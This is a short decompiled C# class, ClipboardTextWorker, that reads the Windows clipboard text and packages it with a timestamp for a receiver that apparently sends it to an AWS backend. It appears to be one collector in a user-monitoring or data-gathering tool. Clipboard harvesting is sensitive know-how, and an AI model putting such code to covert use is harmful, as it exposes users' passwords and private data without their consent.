using DpvClassLibrary.Receivers;
using IO.Swagger.Model;
using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;

namespace DpvClassLibrary.Workers
{
	public class ClipboardTextWorker : DataPackageEnvelopeWorkerBase
	{
		protected override DataPackageEnvelope.ActiveColsEnum ActiveColType => (DataPackageEnvelope.ActiveColsEnum)6;

		public ClipboardTextWorker(IDataPackageEnvelopeReceiver receiver)
			: base(receiver)
		{
		}

		protected override List<DataPackage> GetDataPackages()
		{
			//IL_0056: Unknown result type (might be due to invalid IL or missing references)
			//IL_0060: Expected O, but got Unknown
			byte[] array = null;
			array = ((!Clipboard.ContainsText()) ? Encoding.UTF8.GetBytes("no text") : Encoding.UTF8.GetBytes(Clipboard.GetText()));
			return new List<DataPackage>
			{
				new DataPackage((DataPackage.ColTypeEnum)6, (bool?)false, array, (DateTime?)DataPackageEnvelopeAwsReceiver.ServerTime, (long?)GetAndIncrementWorkSequence())
			};
		}
	}
}
